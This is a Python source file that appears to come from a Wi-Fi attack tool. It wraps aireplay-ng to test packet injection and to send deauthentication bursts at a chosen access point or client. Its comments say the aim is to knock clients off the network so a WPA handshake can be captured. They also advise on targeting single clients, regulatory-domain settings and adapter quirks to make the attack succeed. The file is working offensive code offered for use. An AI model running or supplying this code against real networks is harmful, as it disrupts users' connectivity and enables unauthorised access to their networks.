import re
import subprocess

from rich import print as rprint


def test_injection(monitor_iface, bssid=None):
    """
    Run aireplay-ng's injection test (-9). Returns True if injection works.

    If injection fails here, no amount of deauthing will capture a handshake —
    the frames aren't leaving the adapter (common on RTL8812AU, or when the
    regulatory domain limits TX power).
    """
    cmd = ["aireplay-ng", "-9"]
    if bssid:
        cmd += ["-a", bssid]
    cmd += ["--ignore-negative-one", monitor_iface]

    rprint(f"[cyan][*] Testing packet injection on {monitor_iface}...[/cyan]")
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    except subprocess.TimeoutExpired:
        rprint("[yellow][-] Injection test timed out.[/yellow]")
        return False
    except Exception as e:
        rprint(f"[yellow][-] Injection test error: {e}[/yellow]")
        return False

    out = result.stdout + result.stderr
    # Success looks like "Injection is working!" or a non-zero received %.
    if "Injection is working" in out:
        rprint("[green][+] Injection is working.[/green]")
        return True
    m = re.search(r"(\d+)/30", out)
    if m and int(m.group(1)) > 0:
        rprint(f"[green][+] Injection partially working ({m.group(1)}/30).[/green]")
        return True

    rprint("[red][-] Injection test failed — deauth frames may not transmit.[/red]")
    rprint(
        "[yellow][*] Try: set regulatory domain (iw reg set US), move ~2-3m from "
        "the AP, or check the RTL8812AU driver supports injection on this band.[/yellow]"
    )
    return False


def deauth_burst(monitor_iface, bssid, client=None, count=5):
    """
    Send a single deauth burst with aireplay-ng.

    If `client` is given, the deauth is targeted at that station (far more
    effective than broadcast — many clients/APs ignore broadcast deauth).
    Otherwise a broadcast deauth is sent to the whole AP.
    """
    cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid]
    if client:
        cmd += ["-c", client]
    # --ignore-negative-one avoids aireplay bailing out when the driver reports
    # the channel as -1 (common with RTL8812AU while airodump holds the channel).
    cmd += ["--ignore-negative-one", monitor_iface]

    target = f"{bssid} -> {client}" if client else f"{bssid} (broadcast)"
    rprint(f"[cyan][*] Deauth {count} pkts: {target}[/cyan]")
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
        if result.returncode != 0 and result.stderr.strip():
            rprint(f"[yellow][-] aireplay-ng: {result.stderr.strip()[:120]}[/yellow]")
    except subprocess.TimeoutExpired:
        rprint("[yellow][-] Deauth burst timed out.[/yellow]")
    except Exception as e:
        rprint(f"[yellow][-] Deauth error: {e}[/yellow]")
